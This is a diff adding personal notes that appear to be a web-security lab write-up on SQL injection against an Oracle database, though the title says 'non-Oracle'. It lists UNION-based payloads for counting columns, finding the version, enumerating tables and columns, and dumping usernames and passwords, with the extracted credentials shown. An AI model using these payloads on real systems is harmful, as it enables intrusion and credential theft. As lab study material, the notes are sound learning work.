@@ -1,0 +1,47 @@
+SQL injection attack, listing the database contents on non-Oracle databases
+
+Analysis----
+find the number of columns->
+' order by 1--
+' order by 2-- -> there are two columns
+' order by 3--
+
+find columns with text
+check for columns with text:
+' UNION SELECT NULL, 'a' FROM DUAL-- -> has text
+' UNION SELECT 'a', NULL FROM DUAL-- -> has text
+
+find db version
+Its an oracle 
+
+' UNION SELECT banner, NULL FROM v$version--
+
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+get list of tables in the db ->
+for oracle the querry below is used
+
+' UNION SELECT table_name, NULL FROM all_tables--
+
+found tables -> USERS_CWSQHE
+
+
+
+find columns in users table
+'UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_CWSQHE'--
+
+
+found the following columns with the status 200
+PASSWORD_GEVSYI
+USERNAME_PEHAGI
+
+display usernames and passwords
+' UNION SELECT USERNAME_PEHAGI, PASSWORD_GEVSYI from USERS_CWSQHE--
+
+results
+administrator
+95umntyrvui1k4jlb7pn
+carlos
+uk4n40db4xxtf61ly6dt
+wiener
+5jdf3wadorkt993hhgew
